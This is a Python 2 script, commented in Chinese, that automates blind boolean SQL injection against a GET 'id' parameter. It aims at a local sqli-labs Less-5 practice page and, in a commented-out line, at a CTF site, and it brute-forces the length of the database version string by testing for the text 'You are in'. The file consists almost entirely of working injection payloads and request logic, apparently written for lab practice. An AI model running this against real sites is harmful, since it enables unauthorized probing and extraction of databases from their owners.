# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time

#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
url='http://localhost/sqli-labs/Less-5/?id=' #简单sql注入2
#定义语法关键字测试使用的载荷库
f = file("result.txt", "w+")
# 定义攻击载荷
keyword='You are in'
payload2="%20--+" #终止SQL语句注释符号
versionlen=0
stop=False
for i in range(1,20):
    payload1_version = "1%27%20and%20length(version())="  # 查看length（version）函数判断版本名长度
    try:
        payload = payload1_version + str(i) + payload2
        print url + payload
        req = urllib2.Request(url + payload)
        # print 'req is already: ' + url + quote("1' " + line + " '1'='1")
        res = urllib2.urlopen(req, data=None, timeout=1)
        # print 'res is already '
        text = res.read()
        if (text.find(keyword) > -1):
            print '数据库版本长度是：', str(i)
            f.writelines('数据库版本长度是：'+str(i))
            break
    except Exception, e:
        print e
f.close()
